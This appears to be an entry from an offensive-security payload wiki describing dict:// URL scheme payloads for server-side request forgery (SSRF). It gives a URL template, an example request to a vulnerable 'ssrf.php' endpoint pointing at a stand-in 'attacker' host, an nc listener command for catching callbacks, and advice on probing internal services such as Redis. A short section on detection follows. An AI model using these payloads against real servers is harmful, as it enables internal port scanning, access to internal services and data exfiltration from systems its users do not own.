---
id: 9a83e940-ea27-4eb5-94e1-67ae1f5f1d19
name: Dict-Protocol-SSRF-URL-Example
type: code
language: plaintext
verified: true
created_at: '2023-04-06T03:56:37.818887+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssrf
  - url-scheme
  - payload
validated: true
---

# Dict-Protocol-SSRF-URL-Example

## Code

```plaintext
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

## Description

This code snippet provides the format for constructing dict:// URL scheme payloads used in SSRF attacks, along with an example invocation for a vulnerable PHP endpoint. The dict protocol mimics legitimate dictionary server queries but can be abused to force server-side connections to arbitrary hosts/ports, enabling port scanning, data exfiltration, or internal service interaction. It's particularly useful in blind SSRF scenarios where response data is not directly returned but can be inferred via timing or out-of-band channels.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <user> | Optional username for dict authentication | attacker |
| <auth> | Optional authentication token or password | pass123 |
| <host> | Target host IP or hostname for the SSRF connection | 127.0.0.1 or attacker-controlled IP |
| <port> | Port to connect to on the host | 11111 |
| <word> | Query word for the dict protocol | test |
| <database> | Target dictionary database | webster |
| <n> | Number of match results to request | 1 |
| ssrf.php?url= | Vulnerable endpoint and parameter | http://target.com/ssrf.php?url=dict://... |

## Usage

Embed the dict:// URL into HTTP requests to the target application (e.g., via POST data or query params). Set up a listener (e.g., nc -lvnp 11111) on the specified host/port to capture incoming connections from the victim server. Iterate with dictionary variations to find working payloads, such as probing internal services like Redis (dict://127.0.0.1:6379/...). Deliver via tools like curl or Burp Suite in the [[procedures/URL-Scheme-SSRF-via-Dictionary-Attack]] procedure.

## Detection

- WAF rules blocking non-HTTP schemes (dict://, gopher://) in user input.
- Server logs showing outbound connections to unusual ports/protocols from the web app process.
- High volume of similar requests indicating dictionary brute-forcing.
- Network monitoring for unexpected dict protocol traffic or connections to internal IPs from external-facing servers.

## Related

- [[procedures/URL-Scheme-SSRF-via-Dictionary-Attack]]
- [[curl-send-ssrf-dict-url]]
